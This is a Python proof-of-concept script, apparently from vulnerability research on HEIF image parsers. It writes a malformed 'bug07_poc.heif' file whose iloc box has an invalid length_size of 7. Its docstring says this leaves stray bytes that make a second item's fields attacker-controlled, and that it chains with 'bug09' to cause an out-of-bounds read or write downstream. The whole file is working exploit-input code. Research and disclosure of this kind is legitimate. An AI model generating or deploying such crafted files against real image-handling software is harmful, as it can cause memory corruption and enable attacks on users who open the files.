#!/usr/bin/env python3
"""bug07: iloc length_size = 7 (invalid). Single item; chain via bug09 so
downstream consumer OOBs.

With length_size=7, the 7-byte length field is left in the stream. We
also have a second item whose first 7 bytes get read from those bogus
bytes — making item2.item_id and subsequent fields attacker-controlled."""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    idat_payload = b"\xAA" * 8
    bogus_iloc = hb.iloc(
        version=1,
        offset_size=4,
        length_size=7,         # invalid
        base_offset_size=0,
        index_size=0,
        items=[{
            "item_id": 1, "construction_method": 1, "data_reference_index": 0,
            # 7 length bytes 0x12345678ABCDEF will be left unconsumed.
            "extents": [(0, 0, 0x12345678ABCDEF)],
        }])

    payload = (hb.hdlr(b"pict") + hb.pitm(1) +
               hb.empty_iprp() + hb.iinf([(1, b"hvc1")]) + bogus_iloc +
               hb.idat(idat_payload))
    out = hb.ftyp() + hb.fullbox(b"meta", 0, 0, payload)
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug07_poc.heif")
